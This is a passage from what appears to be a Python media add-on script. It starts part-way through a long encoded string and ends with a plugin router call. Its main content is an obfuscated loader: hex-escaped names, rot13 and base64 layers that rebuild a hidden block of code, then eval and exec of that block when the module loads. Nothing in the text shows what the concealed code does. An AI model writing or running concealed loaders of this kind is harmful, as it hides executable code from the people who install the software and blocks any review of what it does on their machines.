iGzLkLHIcAHZ2AHViLwN2q2cHnJH3BRZmA2t3MIIXDmAgMQp5LFghIl9cAyyDBRZeY21PA3xeJGAvZJ9kGwyQYmOuoyA6BF84Zzj5BF80n3yVFIcCpJ9xpF9VplgiAxZ5n3AGLGuQDyZiH0ZlF2xeGGZeLmqEX2fiYlgxYl85MaZiX0glpQWgYl9YZl84ZzfeLGuWE0IkYmuiIJM6Aay0CG0aQDc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWj0XozIiVQ0tMKMuoPtaKUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzEprQMzKUt3Zyk4AmOprQL4KUt2AIk4AmIprQpmKUtlBIk4ZwOprQWSKUt2ASk4AwIprQLmKUt2Eyk4AwEprQL1KUtlBSk4ZwxaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt3ASk4AmWprQL5KUt2MIk4AwyprQp0KUt3BIk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXFNeVTI2LJjbW1k4AwWprQL5KUt2MIk4AwSprQpmKUt2Z1k4AwyprQL5KUtlMIk4AmIprQMyKUt2BSk4AwIprQp4KUt2L1k4AwyprQL2KUt3BIk4ZwuprQMzKUt3Zyk4AwSprQLmKUt2L1k4AwIprQV5KUtlEIk4AwEprQL1KUt2Z1k4AxMprQL0KUt2AIk4ZwuprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXD0XMKMuoPuwo21jnJkyXUcfnJVhMTIwo21jpzImpluvLKAyAwDhLwL0MTIwo2EyXTI2LJjbW1k4AzIprQL1KUt2MvpcXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))

if __name__ == '__main__':
    router(sys.argv[2][1:])
